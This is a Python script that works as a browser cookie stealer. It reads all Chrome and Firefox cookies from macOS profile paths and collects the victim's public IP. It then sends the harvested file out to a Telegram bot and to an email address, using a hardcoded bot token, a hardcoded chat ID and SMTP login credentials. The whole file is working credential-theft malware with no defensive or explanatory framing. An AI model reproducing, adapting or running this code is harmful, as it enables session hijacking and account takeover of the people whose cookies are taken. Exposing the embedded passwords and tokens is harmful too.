import browser_cookie3
import json
import requests
import os
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

TELEGRAM_BOT_TOKEN = '5444520238:AAHo9DY-sSdKi6wh36WEpTTLA2S5V6Pc5A8'
TELEGRAM_CHAT_ID = '@blavkcap'

# Email settings
SMTP_SERVER = 'smtp.hostinger.com'
SMTP_PORT = 465
EMAIL_ADDRESS = 'mail@lbrealty.online'
EMAIL_PASSWORD = 'Johnson8666@'
RECIPIENT_EMAIL = 'mickeyprosper7@gmail.com'

def get_public_ip():
    try:
        response = requests.get('https://httpbin.org/ip')
        ip_data = response.json()
        return ip_data['origin']
    except Exception as e:
        print(f"Error fetching IP: {e}")
        return "IP not found"

def get_all_cookies():
    all_cookies = {}
    browsers = ['chrome', 'firefox']

    cookie_files = {
        'chrome': os.path.expanduser('~/Library/Application Support/Google/Chrome/Default/Cookies'),
        'firefox': os.path.expanduser('~/Library/Application Support/Firefox/Profiles/200pcvah.default-release/cookies.sqlite')
    }

    for browser in browsers:
        try:
            print(f"Attempting to load cookies from {browser}")
            cookie_file = cookie_files[browser]
            print(f"Using cookie file: {cookie_file}")
            if browser == 'chrome':
                cookies = browser_cookie3.chrome(cookie_file=cookie_file)
            elif browser == 'firefox':
                cookies = browser_cookie3.firefox(cookie_file=cookie_file)
            cookie_list = []

            for cookie in cookies:
                cookie_dict = {
                    'domain': cookie.domain or '',
                    'name': cookie.name,
                    'value': cookie.value,
                    'path': cookie.path or '',
                    'secure': cookie.secure,
                    'expires': cookie.expires or ''
                }
                cookie_list.append(cookie_dict)

            all_cookies[browser] = cookie_list
            print(f"Successfully loaded cookies from {browser}")
        except Exception as e:
            print(f"{browser.capitalize()} error: {e}")
            import traceback
            traceback.print_exc()  # Print detailed error information

    return all_cookies

def save_cookies_to_file(cookies, ip_address):
    with open('cookies.txt', 'w') as f:
        f.write(f"User IP Address: {ip_address}\n\n")
        f.write("Cookies:\n")
        for browser, cookie_list in cookies.items():
            f.write(f"{browser} cookies:\n")
            for cookie in cookie_list:
                f.write(f"Name: {cookie['name']}, Value: {cookie['value']}\n")

def send_file_to_telegram(file_path):
    url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument'
    with open(file_path, 'rb') as f:
        files = {'document': ('cookies.txt', f)}
        payload = {'chat_id': TELEGRAM_CHAT_ID}
        response = requests.post(url, files=files, data=payload)
    return response

def send_file_to_email(file_path):
    # Create the email message
    msg = MIMEMultipart()
    msg['From'] = EMAIL_ADDRESS
    msg['To'] = RECIPIENT_EMAIL
    msg['Subject'] = 'Cookies File'

    body = 'Please find the attached cookies file.'
    msg.attach(MIMEText(body, 'plain'))

    # Attach the file
    attachment = open(file_path, 'rb')
    part = MIMEBase('application', 'octet-stream')
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', f"attachment; filename= {file_path}")

    msg.attach(part)

    # Send the email
    server = smtplib.SMTP_SSL(SMTP_SERVER, SMTP_PORT)
    server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
    text = msg.as_string()
    server.sendmail(EMAIL_ADDRESS, RECIPIENT_EMAIL, text)
    server.quit()

# Get public IP address
ip_address = get_public_ip()
print(f"User IP Address: {ip_address}")

# Get cookies
cookies = get_all_cookies()
print(cookies)

# Save cookies to file
save_cookies_to_file(cookies, ip_address)

# Send cookies file to Telegram
response = send_file_to_telegram('cookies.txt')
print(f"Telegram response: {response.text}")

# Send cookies file to Email
send_file_to_email('cookies.txt')
print("Email sent successfully")
